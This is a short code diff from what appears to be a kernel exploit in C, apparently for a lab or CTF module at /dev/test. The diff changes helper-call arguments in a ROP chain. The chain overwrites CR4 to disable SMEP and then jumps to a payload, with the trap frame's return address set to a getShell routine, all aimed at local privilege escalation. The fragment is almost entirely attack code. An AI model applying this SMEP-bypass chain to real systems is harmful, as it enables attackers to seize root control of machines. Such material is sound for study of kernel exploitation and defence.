@@ -18,8 +18,8 @@ int main(){
     int fd;
     long long rop[20] = { 0, };
 
-    fd = openModule("/dev/test");
-    prepTF64();
+    fd = openModule("/dev/test", 1);
+    prepTF64(1);
     tf.user_rip = getShell; 
 
     rop[0] = 0x4141414141414141;
@@ -28,7 +28,7 @@ int main(){
     rop[3] = 0x4141414141414141;
 
     rop[4] = pop_rax;
-    rop[5] = setCR4(0x1006f0, SMEP);
+    rop[5] = setCR4(0x1006f0, SMEP, 1);
     rop[6] = mov_cr4_rax;
 
     rop[7] = &payload;
